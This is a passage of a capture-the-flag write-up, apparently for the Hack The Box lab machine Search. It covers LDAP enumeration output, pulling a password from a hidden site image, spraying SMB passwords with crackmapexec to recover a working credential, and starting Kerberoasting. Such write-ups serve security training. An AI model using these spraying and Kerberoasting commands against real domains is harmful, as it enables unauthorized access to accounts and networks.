</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1974</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1341</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2026</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2064</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2065</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2066</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2090</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2205</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2204</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2206</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2211</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2239</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2255</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2256</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2309</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2330</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2354</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">800</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1670</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1791</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1935</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2080</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedCapabilities</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2237</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">subschemaSubentry</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Aggregate</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Schema</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">serverName</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">RESEARCH</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Servers</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Sites</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">schemaNamingContext</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Schema</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">namingContexts</span>: <span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">namingContexts</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">namingContexts</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Schema</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">namingContexts</span>: <span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span><span style="color:#66d9ef">DomainDnsZones</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">namingContexts</span>: <span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span><span style="color:#66d9ef">ForestDnsZones</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">isSynchronized</span>: <span style="color:#66d9ef">TRUE</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">highestCommittedUSN</span>: <span style="color:#ae81ff">193803</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">dsServiceName</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">NTDS</span> <span style="color:#66d9ef">Settings</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">RESEARCH</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Servers</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Sites</span>,<span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">dnsHostName</span>: <span style="color:#66d9ef">Research</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">defaultNamingContext</span>: <span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">currentTime</span>: <span style="color:#ae81ff">20211219051116</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>Z
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_      <span style="color:#e6db74">configurationNamingContext</span>: <span style="color:#66d9ef">CN</span><span style="color:#f92672">=</span><span style="color:#66d9ef">Configuration</span>,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span></code></pre></div><p>Helpful nothing in LDAP; the last option is to spray passwords. We could try to find the backup files or build a wordlist.</p>
<h3 id="back-to-web">Back to Web</h3>
<p>Moving back to the home page, we do see some images. That’s <code>Portfolio.</code> opening any image in a new tab, and we see a complete URL. We can manipulate it by changing the image number. After enumerating all images we do see a hidden image <code>image_2</code>, something is wrong with the image =&gt; <a href="http://search.htb/images/slide_2.jpg">Image_2</a></p>
<p>We can even see those images in the source code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">"owl-carousel slide-one-item-alt"</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"images/slide_1.jpg"</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">"Image"</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">"img-fluid"</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"images/slide_2.jpg"</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">"Image"</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">"img-fluid"</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"images/slide_3.jpg"</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">"Image"</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">"img-fluid"</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"images/slide_4.jpg"</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">"Image"</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">"img-fluid"</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Opening the image we can see there are couple of words, moreover we can see there is word <code>password</code> and three usernames. The users are the following =&gt;</p>
<ol>
<li>Hope Sharp</li>
<li>Board Hunter</li>
<li>Board Jordan</li>
</ol>
<p>We can use the same method to enumerate the username and try <code>KERBEROS PRE AUTH.</code> Searching for usernames we find a valid username =&gt; <code>hope.sharp</code> We are not enough lucky to have <code>KERBEROS PRE AUTH.</code></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>Trying reading the image and making a small wordlist, we extract all words.</p>
<h3 id="password-spraying-from-the-image_2-port--80">Password Spraying From The Image_2 [PORT =&gt; 80]</h3>
<h4 id="words-">Words =&gt;</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Working</span>
</span></span><span style="display:flex;"><span>from
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Home</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Key</span>
</span></span><span style="display:flex;"><span>staff
</span></span><span style="display:flex;"><span>to
</span></span><span style="display:flex;"><span>stay
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Hospital</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Appointment</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Harrods</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span>am
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Phisher</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Walter</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Send</span>
</span></span><span style="display:flex;"><span>password
</span></span><span style="display:flex;"><span>to
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Hope</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Sharp</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IsolationIsKey</span>?
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Metting</span>
</span></span><span style="display:flex;"><span>with
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Board</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Hunter</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Jordan</span>
</span></span></code></pre></div><p>We are going to use a tool called <code>Crackmapexec</code> to spray passwords.
The command of <strong>Crackmapexec</strong> looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb search.htb -u users.txt passwords.txt
</span></span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Windows</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">Build</span> <span style="color:#ae81ff">17763</span> x64 (name<span style="color:#e6db74">:RESEARCH</span>) (<span style="color:#e6db74">domain</span>:search<span style="color:#f92672">.</span>htb) (<span style="color:#e6db74">signing</span>:<span style="color:#66d9ef">True</span>) (<span style="color:#e6db74">SMBv1</span>:<span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[-]</span> search<span style="color:#f92672">.</span>htb\keely<span style="color:#f92672">.</span>lyons<span style="color:#e6db74">:Working</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[-]</span> search<span style="color:#f92672">.</span>htb\keely<span style="color:#f92672">.</span>lyons<span style="color:#e6db74">:from</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[-]</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>						<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[-]</span> search<span style="color:#f92672">.</span>htb\hope<span style="color:#f92672">.</span>sharp<span style="color:#e6db74">:Hope</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[-]</span> search<span style="color:#f92672">.</span>htb\hope<span style="color:#f92672">.</span>sharp<span style="color:#e6db74">:Sharp</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[+]</span> 
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb\hope<span style="color:#f92672">.</span>sharp<span style="color:#e6db74">:IsolationIsKey?</span>
</span></span></code></pre></div><p>And finally we have the credentials of user <code>hope.sharp.</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[+]</span> 
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb\hope<span style="color:#f92672">.</span>sharp<span style="color:#e6db74">:IsolationIsKey?</span>
</span></span></code></pre></div><p>Domain =&gt; <code>search.htb</code>
Username =&gt; <code>hope.sharp</code>
Password =&gt; <code>IsolationIsKey?</code></p>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>This credentials are only working for LDAP and SMB. Next step could be Kerberoasting using ldap and hope’s creds.
Using <code>crackmapexec ladp</code> to get hash. Tag used =&gt; <code>--kerberoasting</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># crackmapexec ldap search.htb -u hope.sharp -p 'IsolationIsKey?' --kerberoasting hash</span>
</span></span><span style="display:flex;"><span>
